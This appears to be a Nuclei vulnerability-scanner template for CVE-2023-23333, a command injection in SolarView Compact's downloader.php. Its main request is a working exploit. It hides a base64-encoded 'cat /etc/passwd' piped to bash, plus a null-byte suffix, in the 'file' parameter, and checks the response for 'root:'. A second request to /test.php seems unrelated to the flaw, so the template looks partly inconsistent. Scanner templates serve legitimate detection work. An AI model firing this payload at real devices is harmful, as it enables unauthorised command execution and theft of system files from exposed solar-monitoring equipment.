id: solarview-compact-downloader-rce
info:
  name: SolarView Compact downloader.php RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    There is a command injection vulnerability in SolarView Compact through 6.00, allowing attackers to execute commands by bypassing internal restrictions through downloader.php.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23333
  classification:
    cve-id: CVE-2023-23333
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0
  tags: rce

http:
  - raw:
      - |
        GET /downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base64%20-d|bash%00.zip HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
  - raw:
      - |
        GET /test.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "test"
